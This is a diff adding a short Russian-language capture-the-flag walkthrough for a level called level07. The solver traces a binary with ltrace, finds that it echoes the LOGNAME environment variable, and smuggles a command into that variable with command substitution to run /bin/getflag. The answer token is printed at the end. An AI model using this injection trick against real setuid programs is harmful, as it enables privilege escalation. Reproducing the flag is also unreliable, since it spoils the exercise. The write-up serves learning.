@@ -1,0 +1,17 @@
+1) Видим скрипт ./level07
+2) Посмотрим какие функции вызываются скриптом:
+ltrace ./level07
+
+getenv("LOGNAME")                      = "level07"   - интересная строчка, откуда берется level07, она выводит level07, ту которую получает.
+3) Пытались заменить echo, как в одном из прошлых уровней, но не получилось, стоит защита.
+Don't reverse this ...
+4) Интересно бы посмотреть переменную окружения LOGNAME
+echo $LOGNAME
+Там внутри:
+level07
+4) Заменим наше значение в переменой окружения LOGNAME на нужное нам:
+export LOGNAME=$\(/bin/getflag\)
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+Ответ: fiumuikeil55xe9cu4dood66h
+
